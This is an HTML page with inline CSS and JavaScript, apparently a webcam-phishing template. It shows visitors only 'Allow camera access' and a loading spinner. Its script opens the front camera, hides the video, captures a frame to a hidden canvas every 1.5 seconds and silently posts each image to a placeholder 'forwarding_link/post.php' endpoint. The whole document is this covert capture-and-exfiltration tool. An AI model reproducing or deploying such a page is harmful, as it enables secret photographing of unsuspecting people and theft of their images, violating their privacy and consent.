    <style type="text/css">
        html {
            background-image: url(https://od.lk/s/OV8yNDQyMTA5MDFf/Picsart_24-07-17_19-26-43-870.jpg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: cover;
            background-attachment: fixed;
            height: auto;
            width: auto;
            background-color: #ffffff;
            color: #fff;
            text-align: center;
            font-family: "Kelly Slab", sans-serif;
            margin: 0;
            font-weight: 60;
            height: 60vh;
        }

        .button-like {
            display: inline-block;
            padding: 10px 20px;
            background-color: #3498db; /* Background color */
            color: #ffffff; /* Text color */
            border: 2px solid #2980b9; /* Border color */
            border-radius: 15px;
            font-size: 54px; /* Button text size */
        }

        .load {
            width: 100%;
            height: 100%;
            display: block;
        }
        .loader {
            display: inherit;
            position: absolute;
            top: 40%;
            left: 40%;
            width: 1.5cm;
            height: 1.5cm;
            border-radius: 50%;
            border: 7px solid #eaeaff;
            border-top: 7px solid #aadfff;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="load" id="loader">
        <p>Allow camera access</p>
        <div class="loader"></div>
    </div>

    <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
    </div>

    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {
                    // Handle the response/results
                },
                error: function() {
                    console.error("Error posting data");
                }
            });
        }

        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        // Access webcam
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                console.error(`navigator.getUserMedia error: ${e.toString()}`);
            }
        }

        // Success
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            const context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }

        // Load init
        init();
    </script>
